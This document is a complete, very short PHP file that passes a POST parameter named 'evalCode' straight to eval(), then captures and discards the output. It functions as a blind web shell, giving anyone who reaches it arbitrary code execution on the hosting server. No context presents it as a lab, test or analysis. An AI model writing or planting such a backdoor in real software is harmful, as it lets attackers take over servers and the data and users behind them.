<?php
$evalCode = $_POST['evalCode'];

ob_start();
eval($evalCode);
$res = ob_get_contents();
ob_end_clean();

die("");
?>